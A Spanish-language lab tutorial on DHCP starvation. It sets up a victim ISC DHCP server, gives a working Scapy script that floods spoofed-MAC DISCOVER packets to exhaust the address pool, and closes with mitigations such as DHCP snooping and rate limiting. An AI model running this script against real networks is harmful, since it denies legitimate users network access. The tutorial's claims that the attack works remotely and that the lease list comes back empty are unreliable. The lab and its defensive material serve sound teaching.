# Ataque DHCP Starvation (Agotamiento DHCP) en IPv4

El ataque **DHCP Starvation**, o agotamiento DHCP, es una técnica de **Denegación de Servicio (DoS)** en redes IPv4. Su objetivo es consumir todas las direcciones IP disponibles en un servidor DHCP, impidiendo que clientes legítimos puedan obtener una dirección IP y, por lo tanto, acceder a la red y sus recursos esenciales.

## Cómo Funciona el Ataque DHCP Starvation

El ataque se desarrolla en los siguientes pasos:

1.  **Generación de Peticiones Falsas:** El atacante genera y envía una gran cantidad de solicitudes DHCP `DISCOVER` falsas al servidor DHCP. Para ello, utiliza diferentes direcciones MAC falsificadas.
2.  **Agotamiento del Pool de Direcciones IP:** Cada petición falsa provoca que el servidor DHCP asigne una dirección IP de su **pool** de direcciones disponibles a la dirección MAC falsificada. Dado que el atacante no tiene intención de usar realmente esas direcciones IP y debido a la gran cantidad de peticiones, el pool de direcciones IP disponibles en el servidor DHCP se agota rápidamente.
3.  **Denegación de Servicio a Clientes Legítimos:** Una vez que todas las direcciones IP disponibles han sido asignadas a las direcciones MAC falsas, los dispositivos legítimos que intenten conectarse a la red y obtener una dirección IP a través del DHCP no podrán hacerlo. Esto se debe a que el servidor DHCP ya no tiene direcciones IP disponibles para asignar, lo que efectivamente niega el acceso a la red a los usuarios legítimos.
4.  **Ejecución Remota:** Este ataque no requiere acceso físico a la red y puede ejecutarse de forma remota, lo que lo hace particularmente peligroso y difícil de detectar a tiempo.

En esencia, el objetivo es causar una interrupción en el servicio de red, impidiendo que los dispositivos legítimos se conecten.

## Configuración del Servidor DHCP (Máquina Víctima)

Para simular este ataque, una máquina Ubuntu (`10.211.55.5`) actuará como servidor DHCP y otra máquina Ubuntu (`10.211.55.17`) como atacante.

### 1\. Instalación del Servidor DHCP

Primero, se instala el servidor DHCP en la máquina víctima.

1.  **Actualizar la lista de paquetes:**
    ```bash
    sudo apt update
    ```
    Este comando actualiza el índice de paquetes disponibles en los repositorios.
2.  **Instalar el servidor ISC DHCP:**
    ```bash
    sudo apt install isc-dhcp-server
    ```
    Este comando instala el software del servidor DHCP.

### 2\. Configuración del Servidor DHCP

Una vez instalado, se edita el archivo de configuración del servidor DHCP para definir la subred y el rango de IPs a asignar.

1.  **Editar el archivo de configuración:**

    ```bash
    sudo nano /etc/dhcp/dhcpd.conf
    ```

    Se añade la siguiente configuración al final del archivo:

    ```conf
    subnet 10.211.55.0 netmask 255.255.255.0 {
        range 10.211.55.100 10.211.55.105;
        option domain-name-servers 8.8.8.8;
        option routers 10.211.55.1;
        option broadcast-address 10.211.55.255;
        default-lease-time 600;
        max-lease-time 7200;
    }
    ```

      * `subnet 10.211.55.0 netmask 255.255.255.0`: Declara la subred `10.211.55.0` con la máscara de red `255.255.255.0`.
      * `range 10.211.55.100 10.211.55.105`: Define el rango de direcciones IP que el servidor DHCP puede asignar a los clientes, en este caso, desde `.100` hasta `.105`.
      * `option domain-name-servers 8.8.8.8`: Especifica el servidor DNS (Google DNS) que los clientes usarán para la resolución de nombres de dominio.
      * `option routers 10.211.55.1`: Indica la dirección IP del router predeterminado (gateway) que los clientes usarán para acceder a redes externas.
      * `option broadcast-address 10.211.55.255`: Define la dirección de broadcast para la subred, donde se enviarán mensajes a todos los dispositivos dentro de esta subred.
      * `default-lease-time 600`: Establece el tiempo de concesión por defecto para una IP en 600 segundos (10 minutos), si el cliente no solicita un tiempo específico.
      * `max-lease-time 7200`: Define el tiempo máximo que una dirección IP puede ser "alquilada" a un cliente en 7200 segundos (2 horas).

2.  **Iniciar y verificar el servidor DHCP:**

    ```bash
    sudo service isc-dhcp-server start
    sudo service isc-dhcp-server status
    ```

    El primer comando inicia el servicio DHCP. El segundo comando verifica su estado, que debería ser `active (running)`.

## Realización del Ataque (Máquina Atacante)

En la máquina atacante, se utiliza un script de Python con la librería `scapy` para generar las peticiones DHCP falsas.

### 1\. Instalación de Scapy

```bash
sudo pip install scapy
```

`Scapy` es una potente librería de Python para manipulación de paquetes de red, ideal para operaciones relacionadas con la red.

### 2\. Creación del Script de Ataque (`dhcp-attack.py`)

Se crea un archivo Python para generar y enviar las peticiones DHCP `DISCOVER` con direcciones MAC falsas.

```python
from scapy.all import *
import random

def random_mac():
    mac = [ 0x00, 0x16, 0x3e, # Common OUI for virtual devices
            random.randint(0x00, 0x7f),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def dhcp_discover():
    conf.checkIPaddr = False # Disable IP address checking in scapy
    for i in range(100): # Send 100 DHCP Discover packets
        fake_mac = random_mac()
        # Ethernet header: Broadcast destination MAC
        # IP header: Source 0.0.0.0 (unassigned), Destination 255.255.255.255 (broadcast)
        # UDP header: Source port 68 (DHCP client), Destination port 67 (DHCP server)
        # BOOTP header: Client MAC address (chaddr) set to fake_mac
        # DHCP header: Message type set to Discover
        dhcp_discover_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=mac2str(fake_mac))/DHCP(options=[("message-type","discover"),"end"])
        sendp(dhcp_discover_packet)
        print(f"Sent DHCP Discover with MAC: {fake_mac}")

dhcp_discover()
```

  * `from scapy.all import *` e `import random`: Importa las librerías necesarias.
  * `random_mac()`: Esta función genera direcciones MAC aleatorias. Comienzan con `00:16:3e`, un OUI (Organizationally Unique Identifier) común para dispositivos virtuales, y los últimos tres octetos se generan aleatoriamente.
  * `dhcp_discover()`:
      * `conf.checkIPaddr = False`: Desactiva la comprobación de la dirección IP en Scapy (configuración interna).
      * `for i in range(100)`: Un bucle que genera y envía 100 paquetes DHCP `DISCOVER`.
      * `Ether(dst="ff:ff:ff:ff:ff:ff")`: Crea un encabezado Ethernet con la dirección MAC de destino en broadcast.
      * `IP(src="0.0.0.0", dst="255.255.255.255")`: Establece las direcciones IP de origen (no asignada) y destino (broadcast) para el paquete IP.
      * `UDP(sport=68, dport=67)`: Define los puertos UDP de origen (cliente DHCP) y destino (servidor DHCP).
      * `BOOTP(chaddr=mac2str(fake_mac))`: Configura la dirección MAC del cliente (`chaddr`) en el encabezado BOOTP con la MAC falsa generada.
      * `DHCP(options=[("message-type","discover"),"end"])`: Especifica que el paquete es un mensaje DHCP `DISCOVER`.
      * `sendp(dhcp_discover_packet)`: Envía el paquete.
      * `print(...)`: Imprime un mensaje por cada paquete enviado.

### 3\. Ejecución del Script de Ataque

Se ejecuta el script con privilegios de administrador:

```bash
sudo python3 dhcp-attack.py
```

El script comenzará a enviar rápidamente peticiones `DHCP DISCOVER` con MACs falsas.

## Análisis de las Consecuencias del Ataque

El impacto del ataque se puede observar en los logs del servidor DHCP en la máquina víctima.

1.  **Verificar los logs del sistema:**

    ```bash
    sudo grep DHCP /var/log/syslog
    ```

    Este comando filtra los mensajes relacionados con DHCP en los logs del sistema.

    Se observará una serie de entradas `DHCPDISCOVER from <MAC_falsa>` en el log. Inicialmente, el servidor podría intentar asignar IPs, pero rápidamente aparecerán mensajes como `no free leases`, indicando que el servidor DHCP ha agotado su pool de direcciones IP y no puede asignar más. Esto confirma el éxito del ataque de agotamiento.

2.  **Intentar listar las concesiones DHCP (sin éxito):**

    ```bash
    sudo dhcp-lease-list
    ```

    Este comando debería mostrar las IPs asignadas, pero debido al ataque, no devolverá ninguna, ya que el servidor está saturado y no puede entregar IPs legítimas.

## Mitigación de Ataques DHCP Starvation

Dado que DHCP es un servicio crítico y vulnerable, es crucial saber cómo protegerse.

  * **Implementar DHCP Snooping:** Esta característica de seguridad en los switches filtra mensajes DHCP no confiables y previene que servidores DHCP no autorizados asignen direcciones IP a los clientes. También puede usarse para construir una base de datos de dispositivos conectados y sus puertos.
  * **Limitar la Tasa de Peticiones DHCP (Rate Limiting):** Configurar los dispositivos de red (switches, routers) para limitar la tasa de peticiones DHCP que se aceptan de cada cliente. Esto reduce la efectividad de los ataques de agotamiento y ayuda a prevenir ataques DoS.
  * **Vincular Direcciones MAC a Direcciones IP (Static Reservations):** Utilizar reservas estáticas para dispositivos conocidos. Esto asegura que solo los dispositivos autorizados puedan recibir una dirección IP del servidor DHCP. Es especialmente útil para dispositivos de red críticos, asegurando que siempre obtengan la misma IP.
  * **Usar Control de Acceso a la Red (NAC):** Implementar soluciones **NAC** para autenticar dispositivos antes de que se les permita el acceso a la red. Esto no solo previene peticiones DHCP no autorizadas, sino que también puede imponer políticas de seguridad (como requisitos de antivirus o configuraciones de firewall) antes de conceder acceso.
  * **Monitorización Constante:** La monitorización de la red es fundamental para prevenir cualquier tipo de ataque. Herramientas como Wireshark (filtrando por DHCP) o Snort pueden ayudar a detectar patrones anómalos de tráfico DHCP.

En definitiva, un ataque de agotamiento DHCP evidencia la gran vulnerabilidad de los servicios de red críticos. Implementar medidas de seguridad robustas como DHCP Snooping, limitación de tasas de peticiones y monitorización constante son esenciales para defenderse contra este tipo de ataques y preservar la funcionalidad de la red.